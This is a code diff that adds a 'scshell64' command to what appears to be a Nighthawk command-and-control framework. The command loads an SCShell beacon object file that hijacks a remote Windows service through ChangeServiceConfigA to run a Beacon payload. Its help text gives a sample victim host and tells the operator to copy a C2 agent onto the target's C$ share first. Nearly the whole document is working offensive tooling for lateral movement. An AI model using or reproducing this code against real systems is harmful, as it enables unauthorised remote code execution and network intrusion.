@@ -907,3 +907,64 @@ THIS IS AN AVANTGUARD SCRIPT""",
 )
 
 # endregion
+
+
+
+# region BOF - scshell64
+
+def scshell64(params, info):
+    with open(nighthawk.script_resource(f"SCShell-master/CS-BOF/scshellbof.{info.Agent.ProcessArch}.o"), 'rb') as f:
+        bof = f.read()
+
+    # $target, $service, "C:\\ $+ $exepath"
+    target = ""
+    service = ""
+    exepath = ""
+    if len(params) > 2:
+        target = params[0]
+        service = params[1]
+        exepath = params[2]
+    else:
+        nighthawk.console_write(CONSOLE_ERROR, f"!! Usage:   scshell64 <target> <service> <exepath>")
+        return False
+
+    packer = Packer()
+    packer.addstr(target)
+    packer.addstr(service)
+    packer.addstr(exepath)
+    packed_params = packer.getbuffer()
+
+    if type(packed_params) != bytes:
+        return False
+
+    nighthawk.console_write(CONSOLE_INFO, "executing probe BOF")
+    api.execute_bof(
+        f"scshellbof.{info.Agent.ProcessArch}.o",
+        bof,
+        packed_params,
+        "go",
+        False,
+        0,
+        True,
+        "T1569",
+        show_in_console=True
+    )
+
+
+nighthawk.register_command(
+    scshell64,
+    "scshell64",
+    "BOF - Use ChangeServiceConfigA to run Beacon payload (avantguard script)",
+    "BOF - Use ChangeServiceConfigA to run Beacon payload (avantguard script)",
+    """scshell64 <target> <service> <exepath>
+Summary: Use ChangeServiceConfigA to run Beacon payload.
+Usage:   scshell64 <target> <service> <exepath>
+
+Excample: scshell64 myvictim.contoso.com defragsvc C:\Windows\System32\avcssvc.exe
+Hint: Copy a c2-agent to the remote system \\myvictim\C$\Windows\System32\avcsvc.exe before using this command!
+
+THIS IS AN AVANTGUARD SCRIPT""",
+    "scshell64 myvictim.contoso.com defragsvc C:\Windows\System32\avcssvc.exe"
+)
+
+# endregion
